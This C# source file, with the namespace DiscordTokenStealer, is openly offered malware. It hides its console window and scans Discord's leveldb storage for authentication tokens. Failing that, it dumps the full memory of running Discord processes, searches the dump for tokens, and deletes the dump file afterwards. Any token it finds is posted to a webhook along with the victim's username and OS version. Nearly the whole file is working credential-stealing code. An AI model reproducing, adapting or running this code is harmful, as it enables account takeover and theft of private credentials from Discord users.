using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Text.RegularExpressions;
using System.Text;
using System.Collections.Specialized;
using System.Net;
namespace DiscordTokenStealer
{
    class Program
    {
        public enum MINIDUMP_TYPE
        {
            MiniDumpWithFullMemory = 0x00000002,
        }

        [DllImport("dbghelp.dll", SetLastError = true)]
        static extern bool MiniDumpWriteDump(
            IntPtr hProcess,
            UInt32 ProcessId,
            SafeHandle hFile,
            MINIDUMP_TYPE DumpType,
            IntPtr ExceptionParam,
            IntPtr UserStreamParam,
            IntPtr CallbackParam);


        static int SW_HIDE = 0;
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        public class Discord
        {
            static void HideMe()
            {
                IntPtr myWindow = GetConsoleWindow();
                ShowWindow(myWindow, SW_HIDE);
            }
            static bool LdbGrab()
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb";
                Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");

                string[] dbfiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);

                if (Directory.Exists(path))
                {
                    foreach (var file in dbfiles)
                    {
                        FileInfo info = new FileInfo(file);
                        string contents = File.ReadAllText(info.FullName);
                        Match match = regex.Match(contents);
                        if (match.Success)
                        {
                            Discord.Send("Token : " + match.Value + "\nUserName : " + Environment.UserName + "\nOS : " + Environment.OSVersion);
                            return true;
                        }
                    }
                }
                return false;
            }
            public class Http
            {
                public static byte[] Post(string url, NameValueCollection pairs)
                {
                    using (WebClient webClient = new WebClient())
                        return webClient.UploadValues(url, pairs);
                }
            }
            static bool ExtractTok(string fn)
            {
                Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
                FileInfo info = new FileInfo(fn);
                if (info.Exists)
                {
                    string contents = File.ReadAllText(info.FullName);
                    Match match = regex.Match(contents);
                    if (match.Success)
                    {
                        Discord.Send("Token : " + match.Value + "\nUserName : " + Environment.UserName + "\nOS : " + Environment.OSVersion );
                        return true;
                    }
                        
                    else
                        return false;
                }
                else
                    Console.WriteLine("dump file not found !!");
                return false;
            }
            public static void Send(string content)
            {
                string webHookUrl = "webhook";
                Http.Post(webHookUrl, new NameValueCollection()
            {
                {
                    "content", content
                },

                {
                    "username", "Skinjbir"
                },

                {
                    "avatar_url", "https://i.imgur.com/jFZIN2t.jpg"
                }

            });
            }

            static void Main()
            {
                Program.Discord.HideMe();
                string fo = "discord.dmp";
                if (!Program.Discord.LdbGrab())
                {
                    foreach (Process proid in Process.GetProcessesByName("discord"))
                    {
                        UInt32 ProcessId = (uint)proid.Id;
                        IntPtr hProcess = proid.Handle;
                        MINIDUMP_TYPE DumpType = MINIDUMP_TYPE.MiniDumpWithFullMemory;
                        string out_dump_path = Path.Combine(Directory.GetCurrentDirectory(), "discord.dmp");
                        FileStream procdumpFileStream = File.Create(out_dump_path);
                        bool success = MiniDumpWriteDump(hProcess, ProcessId, procdumpFileStream.SafeFileHandle, DumpType, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                        procdumpFileStream.Close();
                        if (Program.Discord.ExtractTok(fo))
                            System.Environment.Exit(1);
                        File.Delete(fo);
                    }
                }
                Environment.Exit(0);

            }
        }
    }
}
